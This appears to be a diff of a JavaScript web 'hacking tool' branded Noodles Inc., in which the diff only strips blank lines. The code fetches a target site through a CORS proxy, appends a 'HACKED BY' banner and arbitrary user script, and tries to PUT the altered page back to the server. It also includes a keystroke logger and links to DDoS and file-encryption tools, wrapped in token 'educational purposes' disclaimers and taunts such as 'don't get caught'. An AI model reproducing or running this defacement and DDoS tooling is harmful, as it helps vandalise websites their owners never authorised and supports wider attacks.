@@ -1,6 +1,5 @@
 // Defacement tool (REAL - USE WITH EXTREME CAUTION)
  // Noodles Inc. - Unethical Hacking Tool - Defacement Module
- 
 
  //***************************************************************************************************
  //***************************************************************************************************
@@ -10,7 +9,6 @@
  // DO NOT USE THIS ON ANYTHING YOU ARE NOT AUTHORIZED TO.
  // ***************************************************************************************************
  //***************************************************************************************************
- 
 
  // Logger function
  function logAction(message) {
@@ -20,12 +18,10 @@
   }
   console.log(message); // Keep console logging for debugging
  }
- 
 
  // Apply dark theme
  document.body.style.backgroundColor = "black";
  document.body.style.color = "white";
- 
 
  // Disclaimer popup
  window.onload = function () {
@@ -35,16 +31,13 @@
   logAction("User acknowledged the disclaimer and chose to proceed.");
   }
  };
- 
 
  // CORS Anywhere Proxy (Self-Hosted if possible)
  const corsProxy = 'https://corsproxy.io/?'; // Replace with your own instance if possible. Rate limiting is possible with this proxy.
- 
 
  // Function to fetch content with CORS bypass and error handling
  async function fetchWithCORS(url) {
   const proxiedUrl = corsProxy + encodeURIComponent(url);
- 
 
   try {
   const response = await fetch(proxiedUrl, {
@@ -66,7 +59,6 @@
   throw error; // Re-throw to handle it in the main function
   }
  }
- 
 
  // Function to perform defacement
  async function performDefacement(targetURL, defacementCode) {
@@ -77,20 +69,17 @@
   logAction("Invalid URL entered: " + targetURL);
   return;
   }
- 
 
   if (defacementCode.length > 10000) {
   alert("Defacement code too long, dumbass! Keep it under 10000 characters.");
   logAction("Defacement code too long.");
   return;
   }
- 
 
   // Backup functionality (REAL - Grab that shit before you wreck it)
   logAction("Backing up website content...");
   await backupWebsite(targetURL);
   logAction("Backup completed.");
- 
 
   // Preview functionality (See what you're about to unleash)
   logAction("Previewing defacement...");
@@ -102,21 +91,17 @@
   alert("Preview frame not found. Check console, DIPSHIT.");
   logAction("Preview frame not found.");
   }
- 
 
   // Defacement action (REAL - Let the fun begin!)
   logAction("Defacing website...");
- 
 
   const originalContent = await fetchWithCORS(targetURL);
   const modifiedContent = originalContent.replace('</body>', `<div style="color: purple; background-color: darkred; font-size: 2em; text-align: center;">HACKED BY Noodles Inc. - YOU JUST GOT FUCKED!</div>${defacementCode}</body>`);
- 
 
   // Attempt to PUT the modified content. If that fails, attempt to inject via script tag.
   try {
   // Use a proxy to bypass CORS for PUT requests
   const proxiedUrl = corsProxy + encodeURIComponent(targetURL);
- 
 
   const response = await fetch(proxiedUrl, {
   method: 'PUT',
@@ -128,12 +113,10 @@
   },
   body: modifiedContent,
   });
- 
 
   if (!response.ok) {
   throw new Error(`HTTP error during PUT! Status: ${response.status}`);
   }
- 
 
   logAction('Defacement successful using PUT!');
   } catch (putError) {
@@ -142,7 +125,6 @@
   // Inject the defacement code using a script tag. Less reliable, but bypasses some protections.
   injectDefacement(targetURL, defacementCode);
   }
- 
 
   } catch (error) {
   console.error("Error:", error);
@@ -150,7 +132,6 @@
   logAction(`Critical error: ${error}`);
   }
  }
- 
 
  // Function to inject defacement code using a script tag
  async function injectDefacement(targetURL, defacementCode) {
@@ -164,23 +145,18 @@
   'X-Requested-With': 'XMLHttpRequest'
   }
   });
- 
 
   if (!response.ok) {
   throw new Error(`HTTP error! Status: ${response.status}`);
   }
- 
 
   let originalContent = await response.text();
- 
 
   // Create a script element with the defacement code
   const scriptTag = `<script>${defacementCode}</script>`;
- 
 
   // Inject the script tag into the body of the original content
   const modifiedContent = originalContent.replace('</body>', `${scriptTag}</body>`);
- 
 
   // Attempt to PUT the modified content back to the server
   const putResponse = await fetch(proxiedUrl, {
@@ -193,12 +169,10 @@
   },
   body: modifiedContent
   });
- 
 
   if (!putResponse.ok) {
   throw new Error(`HTTP error during PUT! Status: ${putResponse.status}`);
   }
- 
 
   logAction('Defacement successful using script injection!');
   } catch (error) {
@@ -207,7 +181,6 @@
   logAction(`Script injection error: ${error}`);
   }
  }
- 
 
  // Add form for target URL and defacement code
  function addDefacementForm() {
@@ -221,32 +194,26 @@
   <button id="defaceButton">Deface Website</button>
   `;
   document.body.appendChild(formDiv);
- 
 
   // Event listener for deface button click
   document.getElementById("defaceButton").addEventListener("click", async function () {
   const targetURL = document.getElementById("targetURL").value;
   const defacementCode = document.getElementById("defacementCode").value;
- 
 
   if (!targetURL || !defacementCode) {
   alert("ENTER A TARGET AND SOME FUCKING CODE, YA MORON.");
   logAction("User failed to enter target URL or defacement code.");
   return;
   }
- 
 
   logAction(`Target URL: ${targetURL}`);
   logAction(`Defacement Code: ${defacementCode}`);
- 
 
   await performDefacement(targetURL, defacementCode);
   });
  }
- 
 
  addDefacementForm();
- 
 
  // Educational Information
  const defacementInfo = `
@@ -261,13 +228,11 @@
   <h3>WARNING:</h3>
   <p>This is for educational purposes ONLY. Using this tool to deface websites without permission is illegal and unethical. Noodles Inc. is not responsible for your stupidity. Don't be a dumbass.</p>
  `;
- 
 
  // Insert educational information into the page
  const infoElement = document.createElement("div");
  infoElement.innerHTML = defacementInfo;
  document.body.appendChild(infoElement);
- 
 
  // Function to add backup functionality
  async function backupWebsite(targetURL) {
@@ -286,22 +251,18 @@
   logAction(`Error during backup: ${error}`);
   }
  }
- 
 
  // Function to add restore functionality
  async function restoreWebsite(targetURL) {
   const backupURL = "website_backup.html";
- 
 
   try {
   logAction("Attempting to restore website...");
   const backupResponse = await fetch(backupURL, { mode: 'cors' });
   const backupContent = await backupResponse.text();
- 
 
   // Use a proxy to bypass CORS for PUT requests
   const proxiedUrl = corsProxy + encodeURIComponent(targetURL);
- 
 
   const response = await fetch(proxiedUrl, {
   method: 'PUT',
@@ -313,12 +274,10 @@
   },
   body: backupContent,
   });
- 
 
   if (!response.ok) {
   throw new Error(`HTTP error! Status: ${response.status}`);
   }
- 
 
   logAction("Website restoration completed for: " + targetURL);
   } catch (error) {
@@ -327,7 +286,6 @@
   logAction(`Error during restoration: ${error}`);
   }
  }
- 
 
  // Add preview functionality
  function addPreview() {
@@ -338,10 +296,8 @@
   `;
   document.body.appendChild(previewDiv);
  }
- 
 
  addPreview();
- 
 
  // Validate URL
  function isValidURL(str) {
@@ -352,25 +308,20 @@
   return false;
   }
  }
- 
 
  // Security Headers (Gotta protect ourselves, right?)
  function setSecurityHeaders() {
   // Prevent Cross-Site Scripting (XSS) attacks
   document.head.appendChild(createMetaTag('http-equiv', 'Content-Security-Policy', "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src 'self' data:;"));
- 
 
   // Prevent Clickjacking attacks
   document.head.appendChild(createMetaTag('http-equiv', 'X-Frame-Options', 'DENY'));
- 
 
   // Enable Cross-Site Scripting (XSS) filter
   document.head.appendChild(createMetaTag('http-equiv', 'X-XSS-Protection', '1; mode=block'));
- 
 
   // Prevent MIME-sniffing vulnerabilities
   document.head.appendChild(createMetaTag('http-equiv', 'X-Content-Type-Options', 'nosniff'));
- 
 
   function createMetaTag(httpEquiv, content, deny) {
   const meta = document.createElement('meta');
@@ -382,10 +333,8 @@
   return meta;
   }
  }
- 
 
  setSecurityHeaders();
- 
 
  // Scanlines effect (for that хацкер aesthetic)
  const scanlines = document.createElement('div');
@@ -400,7 +349,6 @@
   z-index: 9999;
  `;
  document.body.appendChild(scanlines);
- 
 
  // Reporting Feature (For documenting findings and vulnerabilities)
  function reportIssue() {
@@ -410,7 +358,6 @@
   alert("Thanks for the report, dumbass. We'll totally ignore it.");
   }
  }
- 
 
  const reportButton = document.createElement('button');
  reportButton.textContent = "Report Issue";
@@ -427,7 +374,6 @@
  `;
  reportButton.addEventListener('click', reportIssue);
  document.body.appendChild(reportButton);
- 
 
  // Floating particles effect
  const particleContainer = document.createElement('div');
@@ -442,7 +388,6 @@
   overflow: hidden;
  `;
  document.body.appendChild(particleContainer);
- 
 
  function createParticle() {
   const particle = document.createElement('div');
@@ -458,7 +403,6 @@
   animation: float ${Math.random() * 5 + 5}s linear infinite;
   `;
   particleContainer.appendChild(particle);
- 
 
   particle.addEventListener('animationiteration', () => {
   particle.style.top = `${Math.random() * 100}%;
@@ -466,12 +410,10 @@
   particle.style.opacity = `${Math.random()}`;
   });
  }
- 
 
  for (let i = 0; i < 50; i++) {
   createParticle();
  }
- 
 
  // Keylogger
  function keylogger() {
@@ -479,11 +421,9 @@
   logAction(`Key pressed: ${event.key}`);
   });
  }
- 
 
  // Run keylogger
  keylogger();
- 
 
  // Add Navbar
  function addNavbar() {
@@ -500,7 +440,6 @@
   justify-content: space-around;
   align-items: center;
   `;
- 
 
   const logo = document.createElement('span');
   logo.textContent = 'Noodles Inc.';
@@ -511,7 +450,6 @@
   cursor: pointer;
   `;
   navbar.appendChild(logo);
- 
 
   const defaceButtonNav = document.createElement('button');
   defaceButtonNav.textContent = 'Defacement Tool';
@@ -527,7 +465,6 @@
   redirectToDeface();
   });
   navbar.appendChild(defaceButtonNav);
- 
 
   const ddosButtonNav = document.createElement('button');
   ddosButtonNav.textContent = 'DDoS Tool';
@@ -543,7 +480,6 @@
   redirectToDDOS();
   });
   navbar.appendChild(ddosButtonNav);
- 
 
   const encryptButtonNav = document.createElement('button');
   encryptButtonNav.textContent = 'File Encryption Tool';
@@ -559,15 +495,12 @@
   redirectToEncryptionTool();
   });
   navbar.appendChild(encryptButtonNav);
- 
 
   document.body.appendChild(navbar);
  }
- 
 
  // Run addNavbar
  addNavbar();
- 
 
  // Add Sidebar
  function addSidebar() {
@@ -585,7 +518,6 @@
   flex-direction: column;
   align-items: center;
   `;
- 
 
   const sidebarTitle = document.createElement('span');
   sidebarTitle.textContent = 'Tools';
@@ -596,7 +528,6 @@
   margin-bottom: 15px;
   `;
   sidebar.appendChild(sidebarTitle);
- 
 
   const defaceButtonSidebar = document.createElement('button');
   defaceButtonSidebar.textContent = 'Defacement';
@@ -613,7 +544,6 @@
   redirectToDeface();
   });
   sidebar.appendChild(defaceButtonSidebar);
- 
 
   const ddosButtonSidebar = document.createElement('button');
   ddosButtonSidebar.textContent = 'DDoS';
@@ -630,7 +560,6 @@
   redirectToDDOS();
   });
   sidebar.appendChild(ddosButtonSidebar);
- 
 
   const encryptButtonSidebar = document.createElement('button');
   encryptButtonSidebar.textContent = 'Encryption';
@@ -646,15 +575,12 @@
   redirectToEncryptionTool();
   });
   sidebar.appendChild(encryptButtonSidebar);
- 
 
   document.body.appendChild(sidebar);
  }
- 
 
  // Run addSidebar
  addSidebar();
- 
 
  // Educational information for DDoS
  const ddosInfo = `
@@ -669,7 +595,6 @@
   <h3>WARNING:</h3>
   <p>This is for educational purposes ONLY. Using this tool to launch DDoS attacks without permission is illegal and unethical. Noodles Inc. is not responsible for your stupidity. Don't be a dumbass.</p>
  `;
- 
 
  // Educational information for Encryption
  const encryptionInfo = `
@@ -684,36 +609,30 @@
   <h3>WARNING:</h3>
   <p>This is for educational purposes ONLY. Using this tool to encrypt files for illegal activities is illegal and unethical. Noodles Inc. is not responsible for your stupidity. Don't be a dumbass.</p>
  `;
- 
 
  // Insert educational information into the page
  const ddosInfoElement = document.createElement("div");
  ddosInfoElement.innerHTML = ddosInfo;
  document.body.appendChild(ddosInfoElement);
- 
 
  const encryptionInfoElement = document.createElement("div");
  encryptionInfoElement.innerHTML = encryptionInfo;
  document.body.appendChild(encryptionInfoElement);
- 
 
  // Function to redirect to the encryption tool
  function redirectToEncryptionTool() {
   window.location.href = '/encryption';
  }
- 
 
  // Function to redirect to the DDoS tool
  function redirectToDDOS() {
   window.location.href = '/ddos';
  }
- 
 
  // Function to redirect to the Defacement Tool
  function redirectToDeface() {
   window.location.href = "/defacement";
  }
- 
 
  // Auto Reload (refresh every 10 seconds)
  function autoReload() {
@@ -721,16 +640,13 @@
   location.reload();
   }, 10000);
  }
- 
 
  // Run autoReload
  autoReload();
- 
 
  // Function to add Navbar links
  function addNavbarLinks() {
   const navbar = document.querySelector('nav');
- 
 
   const defaceLink = document.createElement('a');
   defaceLink.textContent = 'Defacement Tool';
@@ -741,7 +657,6 @@
   padding: 10px;
   `;
   navbar.appendChild(defaceLink);
- 
 
   const ddosLink = document.createElement('a');
   ddosLink.textContent = 'DDoS Tool';
@@ -752,7 +667,6 @@
   padding: 10px;
   `;
   navbar.appendChild(ddosLink);
- 
 
   const encryptLink = document.createElement('a');
   encryptLink.textContent = 'File Encryption Tool';
@@ -764,15 +678,12 @@
   `;
   navbar.appendChild(encryptLink);
  }
- 
 
  addNavbarLinks();
- 
 
  // Add Backup button to the Navbar
  function addBackupButtonNavbar() {
   const navbar = document.querySelector('nav');
- 
 
   const backupButtonNav = document.createElement('button');
   backupButtonNav.textContent = 'Backup Website';
@@ -794,15 +705,12 @@
   });
   navbar.appendChild(backupButtonNav);
  }
- 
 
  addBackupButtonNavbar();
- 
 
  // Add Restore button to the Navbar
  function addRestoreButtonNavbar() {
   const navbar = document.querySelector('nav');
- 
 
   const restoreButtonNav = document.createElement('button');
   restoreButtonNav.textContent = 'Restore Website';
@@ -824,10 +732,8 @@
   });
   navbar.appendChild(restoreButtonNav);
  }
- 
 
  addRestoreButtonNavbar();
- 
 
  // Function to add DDoS to .onion functionality
  function addOnionSupport() {
@@ -839,11 +745,9 @@
   // Add your DDoS function call here
   alert(`DDoS attack initiated on ${targetURL}. Good luck, have fun, don't get caught!`);
   logAction(`DDoS attack initiated on ${targetURL}`);
- 
 
   // Redirect to DDoS tool page with target URL
   window.location.href = `/ddos?targetURL=${encodeURIComponent(targetURL)}`;
- 
 
   } else {
   alert("ENTER A TARGET URL, YA MORON!");
@@ -852,10 +756,8 @@
   });
   }
  }
- 
 
  addOnionSupport();
- 
 
  // Function to enhance logging
  function enhanceLogging() {
@@ -865,7 +767,6 @@
   logAction(`Console: ${message}`);
   };
   })(console.log);
- 
 
   console.error = (function (originalError) {
   return function (message) {
@@ -874,10 +775,8 @@
   };
   })(console.error);
  }
- 
 
  enhanceLogging();
- 
 
  // Improved error handling
  window.onerror = function (message, source, lineno, colno, error) {
@@ -885,7 +784,6 @@
   alert(`An error occurred: ${message}. Check the console, DIPSHIT.`);
   logAction(`Global error: ${message} at line ${lineno}`);
  };
- 
 
  // Add CSS styles for better appearance
  function addStyles() {
@@ -915,6 +813,5 @@
   `;
   document.head.appendChild(style);
  }
- 
 
  addStyles();
